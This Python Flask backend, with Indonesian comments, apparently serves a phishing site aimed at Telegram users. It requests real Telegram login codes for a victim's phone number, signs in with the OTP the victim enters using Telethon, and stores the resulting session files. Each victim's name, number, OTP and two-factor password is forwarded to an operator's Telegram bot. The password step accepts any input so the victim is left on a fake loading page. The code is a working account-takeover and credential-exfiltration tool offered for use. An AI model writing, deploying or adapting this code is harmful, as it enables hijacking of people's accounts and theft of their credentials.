import os
import asyncio
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
# Izinkan semua origin agar Netlify bisa memanggil backend
CORS(app, resources={r"/*": {"origins": "*"}})

# Variabel Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

sessions_hash = {}

def send_to_bot(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
    except:
        pass

async def telethon_logic(data):
    step = data.get('step')
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi = data.get('sandi')
    nama = data.get('nama', 'User')

    client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        # STEP 1: Kirim OTP
        if step == 1:
            sent_code = await client.send_code_request(nomor)
            sessions_hash[nomor] = sent_code.phone_code_hash
            send_to_bot(f"📲 *Mencoba Daftar*\nNama: {nama}\nNomor: {nomor}")
            return {"status": "success"}, 200

        # STEP 2: Verifikasi OTP & Deteksi 2FA
        elif step == 2:
            phone_code_hash = sessions_hash.get(nomor)
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
                send_to_bot(f"✅ *Login Tanpa 2FA*\nNomor: {nomor}\nOTP: {otp}")
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                # Jika ada 2FA, perintahkan website pindah ke halaman sandi
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                return {"status": "error", "message": "Kode OTP Salah!"}, 400

        # STEP 3: Terima Sandi & Langsung Lolos ke Loading
        elif step == 3:
            send_to_bot(f"🔑 *Sandi Diterima*\nNomor: {nomor}\nSandi: {sandi}")
            # Beri respon sukses tanpa cek benar/salah agar langsung ke halaman loading 24 jam
            return {"status": "success"}, 200

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

# FUNGSI DARURAT FIX CORS: Memaksa header agar tidak merah
def _force_cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS, GET"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    return response

@app.route('/register', methods=['POST', 'OPTIONS'])
def register():
    # Menangani pengecekan browser (Preflight)
    if request.method == 'OPTIONS':
        return _force_cors(make_response())
        
    data = request.json
    try:
        # Menjalankan logika Telethon
        result, status_code = async_to_sync(telethon_logic)(data)
        response = make_response(jsonify(result), status_code)
        return _force_cors(response)
    except Exception as e:
        response = make_response(jsonify({"status": "error", "message": str(e)}), 500)
        return _force_cors(response)

if __name__ == "__main__":
    # Gunakan port 8080 sesuai log Railway kamu
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)